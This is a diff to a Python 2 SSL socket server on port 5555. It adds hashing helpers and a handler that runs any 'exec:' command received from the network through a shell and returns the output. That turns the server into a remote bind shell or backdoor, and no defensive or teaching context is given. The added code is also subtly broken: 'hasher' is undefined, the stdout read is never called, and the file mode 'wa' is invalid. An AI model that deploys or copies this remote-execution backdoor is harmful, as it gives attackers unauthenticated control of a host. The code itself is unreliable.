@@ -1,4 +1,5 @@
-import socket, ssl, sys, os
+import socket, ssl, sys, os, hmac, hashlib
+from subprocess import Popen, PIPE, STDOUT
 
 bindsocket = socket.socket()
 bindsocket.bind(('', 5555))
@@ -10,6 +11,25 @@ def RecvData():
 
 def SendData(inText):
     connstream.write(inText)
+
+def CheckHash(fileName,fileHashHEX):
+    with open(fileName, 'rb') as inFile:
+        buf = inFile.read()
+        hasher.update(buf)
+    if hmac.compare_digest(hasher.hexdigest(),fileHashHEX) == True:
+        pass
+    else:
+        print "Warning!"
+
+def CalcHash(fileName):
+    with open(fileName, 'rb') as inFile:
+        buf = inFile.read()
+        hasher.update(buf)
+    return hasher.hexdigest()
+
+def EXEC(cmd):
+    p = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
+    return p.stdout.read
 
 def DownloadFILE(fileName):
     fileDOWN = open(fileName, 'wa')
@@ -69,6 +89,9 @@ while True:
             connstream.shutdown(socket.SHUT_RDWR)
             connstream.close()
             break
+        elif inText.startswith("exec"):
+            outEXEC = EXEC(inText.split(":")[1])
+            SendData(outEXEC)
         else:
             connstream.write(inText)
             outTT = RecvData()
